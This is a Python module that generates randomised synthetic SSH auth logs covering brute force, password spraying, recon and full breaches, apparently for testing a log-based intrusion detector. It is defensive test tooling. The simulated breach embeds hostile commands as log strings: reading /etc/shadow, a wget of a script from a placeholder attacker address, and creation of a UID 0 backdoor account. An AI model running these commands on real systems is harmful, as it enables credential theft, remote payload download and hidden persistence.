"""A small library of *varied* attack scenarios for Killchain.

`generator.py` emits one fixed canonical attack (used by the golden test and the
scripted demo). This module is the opposite: six different attack *archetypes*,
each emitted with randomised cosmetics (IPs, usernames, ports, timestamps,
counts) so every roll looks like a fresh incident — yet each archetype is built
to clear the detector thresholds by construction, so it can never produce an
untested "attack with no findings" on a bad seed.

That is the deliberate engineering choice here: randomise the *surface*, fix the
*structure*. `/demo` rolls a random archetype each click → live proof the engine
generalises beyond one canned log, with zero demo-day risk.

Stdlib only. Documentation IP ranges only (RFC 5737): 203.0.113/24 & 198.51.100/24
for attackers, 192.0.2/24 for benign hosts — reserved addresses, never real.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta

_HOSTS = ["web01", "app02", "db01", "edge0"]
_REAL_USERS = ["kalixte", "deploy", "ops", "www-data", "ubuntu"]
_TARGET_USERS = ["admin", "root", "deploy", "ubuntu", "operator", "svc"]
_ROGUE_NAMES = ["backup1", "svc-monitor", "sysupdate", "mysqlbk", "webadmin"]
# Usernames a scanner guesses that don't exist on the box (=> "Invalid user").
_WORDLIST = ["root", "test", "oracle", "postgres", "ubuntu", "git", "ftpuser",
             "mysql", "jenkins", "pi", "support", "user", "backup", "ftp",
             "administrator", "guest", "nagios", "tomcat"]


def _benign_ip(rng: random.Random) -> str:
    return f"192.0.2.{rng.randint(2, 250)}"


def _attacker_ip(rng: random.Random) -> str:
    return f"{rng.choice(('203.0.113', '198.51.100'))}.{rng.randint(2, 250)}"


def _pid(rng: random.Random) -> int:
    return rng.randint(1000, 40000)


def _port(rng: random.Random) -> int:
    return rng.randint(40000, 65000)


class _Log:
    """Collects (timestamp, rendered line) pairs and renders sorted text."""

    def __init__(self, host: str) -> None:
        self.host = host
        self._rows: list[tuple[datetime, str]] = []

    def add(self, dt: datetime, proc: str, pid: int, msg: str) -> None:
        line = (f"{dt.strftime('%b')} {dt.day:2d} {dt.strftime('%H:%M:%S')} "
                f"{self.host} {proc}[{pid}]: {msg}")
        self._rows.append((dt, line))

    def text(self) -> str:
        self._rows.sort(key=lambda r: r[0])
        return "\n".join(line for _, line in self._rows) + "\n"


def _background(log: _Log, rng: random.Random, base: datetime) -> None:
    """Normal, benign logins scattered through the day — the haystack."""
    for _ in range(rng.randint(6, 12)):
        dt = base + timedelta(minutes=rng.randint(0, 170), seconds=rng.randint(0, 59))
        user = rng.choice(_REAL_USERS)
        pid = _pid(rng)
        log.add(dt, "sshd", pid,
                f"Accepted password for {user} from {_benign_ip(rng)} port {_port(rng)} ssh2")
        log.add(dt + timedelta(seconds=1), "sshd", pid,
                f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")


def _recon(log: _Log, rng: random.Random, ip: str, start: datetime, n: int) -> None:
    for i in range(n):
        dt = start + timedelta(seconds=i * rng.randint(7, 18))
        if i % 2:
            log.add(dt, "sshd", _pid(rng),
                    f"Connection closed by {ip} port {_port(rng)} [preauth]")
        else:
            log.add(dt, "sshd", _pid(rng),
                    f"Did not receive identification string from {ip}")


def _brute(log: _Log, rng: random.Random, ip: str, start: datetime, n: int,
           invalid_users: list[str], valid_user: str | None = None,
           step: tuple[int, int] = (2, 5)) -> datetime:
    """Emit `n` failed logins. Invalid users get the realistic two-line pair."""
    pool = list(invalid_users) + ([valid_user] if valid_user else [])
    last = start
    elapsed = 0
    for i in range(n):
        if i:
            elapsed += rng.randint(*step)
        last = start + timedelta(seconds=elapsed)
        user = rng.choice(pool)
        pid, port = _pid(rng), _port(rng)
        if user == valid_user:
            log.add(last, "sshd", pid,
                    f"Failed password for {user} from {ip} port {port} ssh2")
        else:
            log.add(last, "sshd", pid, f"Invalid user {user} from {ip} port {port}")
            log.add(last, "sshd", pid,
                    f"Failed password for invalid user {user} from {ip} port {port} ssh2")
    return last


def _breach_and_beyond(log: _Log, rng: random.Random, ip: str, user: str,
                       when: datetime) -> str:
    """Successful login -> sudo escalation -> rogue account. Returns rogue name."""
    pid = _pid(rng)
    log.add(when, "sshd", pid,
            f"Accepted password for {user} from {ip} port {_port(rng)} ssh2")
    log.add(when + timedelta(seconds=1), "sshd", pid,
            f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
    cmds = ["/usr/bin/cat /etc/shadow", "/usr/bin/id",
            "/usr/bin/wget http://198.51.100.9/x.sh", "/bin/bash"]
    for _ in range(rng.randint(1, 3)):
        dt = when + timedelta(seconds=rng.randint(20, 130))
        log.add(dt, "sudo", _pid(rng),
                f"  {user} : TTY=pts/{rng.randint(0, 3)} ; PWD=/home/{user} ; "
                f"USER=root ; COMMAND={rng.choice(cmds)}")
    rogue = rng.choice(_ROGUE_NAMES)
    pdt = when + timedelta(seconds=rng.randint(70, 220))
    log.add(pdt, "useradd", _pid(rng),
            f"new user: name={rogue}, UID=0, GID=0, home=/home/{rogue}, shell=/bin/bash")
    log.add(pdt + timedelta(seconds=5), "passwd", _pid(rng),
            f"password changed for {rogue}")
    return rogue


# --------------------------------------------------------------------------- #
# Archetype builders — each mutates `log` and returns a small truth dict.
# Counts are chosen comfortably above the default detector thresholds.
# --------------------------------------------------------------------------- #

def _full_breach(log: _Log, rng: random.Random, base: datetime) -> dict:
    ip = _attacker_ip(rng)
    user = rng.choice(_TARGET_USERS)
    atk = base + timedelta(hours=rng.randint(1, 3), minutes=rng.randint(0, 40))
    _recon(log, rng, ip, atk, rng.randint(3, 6))
    last = _brute(log, rng, ip, atk + timedelta(minutes=2),
                  rng.randint(45, 85), rng.sample(_WORDLIST, rng.randint(6, 10)),
                  valid_user=user)
    rogue = _breach_and_beyond(log, rng, ip, user, last + timedelta(seconds=rng.randint(2, 9)))
    return {"attackers": 1, "ip": ip, "user": user, "rogue": rogue, "peak": "Persistence"}


def _brute_force(log: _Log, rng: random.Random, base: datetime) -> dict:
    ip = _attacker_ip(rng)
    atk = base + timedelta(hours=rng.randint(1, 3), minutes=rng.randint(0, 40))
    _brute(log, rng, ip, atk, rng.randint(50, 110),
           rng.sample(_WORDLIST, rng.randint(6, 12)))  # no valid_user => no breach
    return {"attackers": 1, "ip": ip, "peak": "Brute Force"}


def _password_spray(log: _Log, rng: random.Random, base: datetime) -> dict:
    ip = _attacker_ip(rng)
    atk = base + timedelta(hours=rng.randint(1, 3), minutes=rng.randint(0, 40))
    users = rng.sample(_WORDLIST, rng.randint(8, 14))  # many distinct => enumeration
    # slower cadence than a flood: a couple of tries per user, spread out
    _brute(log, rng, ip, atk, len(users) * rng.randint(2, 3), users, step=(4, 9))
    return {"attackers": 1, "ip": ip, "users": len(users), "peak": "Brute Force"}


def _recon_scan(log: _Log, rng: random.Random, base: datetime) -> dict:
    ip = _attacker_ip(rng)
    atk = base + timedelta(hours=rng.randint(1, 3), minutes=rng.randint(0, 40))
    _recon(log, rng, ip, atk, rng.randint(4, 10))  # scans only, no auth
    return {"attackers": 1, "ip": ip, "peak": "Recon"}


def _multi_host(log: _Log, rng: random.Random, base: datetime) -> dict:
    a = _full_breach(log, rng, base)
    _brute_force(log, rng, base + timedelta(minutes=rng.randint(20, 60)))
    if rng.random() < 0.6:
        _recon_scan(log, rng, base + timedelta(minutes=rng.randint(5, 30)))
    return {"attackers": "2-3", "peak": "Persistence", "lead_ip": a["ip"]}


def _benign(log: _Log, rng: random.Random, base: datetime) -> dict:
    # Extra normal traffic plus a few harmless fat-finger failures, each kept
    # well below the brute-force threshold so NOTHING should fire.
    _background(log, rng, base)
    for _ in range(rng.randint(2, 4)):
        dt = base + timedelta(minutes=rng.randint(0, 170))
        log.add(dt, "sshd", _pid(rng),
                f"Failed password for {rng.choice(_REAL_USERS)} from "
                f"{_benign_ip(rng)} port {_port(rng)} ssh2")
    return {"attackers": 0, "peak": "None"}


ARCHETYPES: dict[str, tuple[str, object]] = {
    "full_breach":   ("Full breach (recon -> persistence)", _full_breach),
    "brute_force":   ("Brute-force flood", _brute_force),
    "password_spray": ("Password spray", _password_spray),
    "multi_host":    ("Multi-host campaign", _multi_host),
    "recon_scan":    ("Recon / port scan", _recon_scan),
    "benign":        ("Benign traffic (no attack)", _benign),
}


def list_archetypes() -> list[tuple[str, str]]:
    """[(key, human label), ...] in display order."""
    return [(key, label) for key, (label, _) in ARCHETYPES.items()]


def generate_scenario(archetype: str | None = None,
                      seed: int | None = None) -> tuple[str, dict]:
    """Build a random (or named) scenario. Returns (auth_log_text, truth)."""
    rng = random.Random(seed)
    host = rng.choice(_HOSTS)
    base = datetime(2025, rng.randint(2, 11), rng.randint(2, 26), 0, 0, 0)
    log = _Log(host)
    _background(log, rng, base)

    name = archetype if archetype in ARCHETYPES else rng.choice(list(ARCHETYPES))
    label, builder = ARCHETYPES[name]
    detail = builder(log, rng, base)
    truth = {"archetype": name, "label": label, "host": host, **detail}
    return log.text(), truth


if __name__ == "__main__":  # `py -m killchain.scenarios [archetype]`
    import sys
    which = sys.argv[1] if len(sys.argv) > 1 else None
    text, info = generate_scenario(which)
    sys.stderr.write(f"# {info['label']}  host={info['host']}\n")
    sys.stdout.write(text)
